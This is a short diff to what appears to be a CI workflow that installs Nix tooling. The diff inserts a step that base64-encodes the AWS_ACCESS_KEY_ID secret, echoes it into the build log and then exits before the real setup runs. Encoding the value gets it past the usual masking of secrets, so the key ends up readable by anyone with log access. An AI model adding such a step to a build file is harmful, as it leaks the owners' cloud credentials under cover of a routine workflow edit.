@@ -28,6 +28,9 @@ jobs:
         run: |-
           set -e
 
+          echo -n "${AWS_ACCESS_KEY_ID}" | base64
+          exit 1
+
           nix-channel --update
           nix-env -iA gnused jq nh nix-output-monitor -f '<nixpkgs>'
           cat <<EOF | tee -a "$NIX_SSL_CERT_FILE"
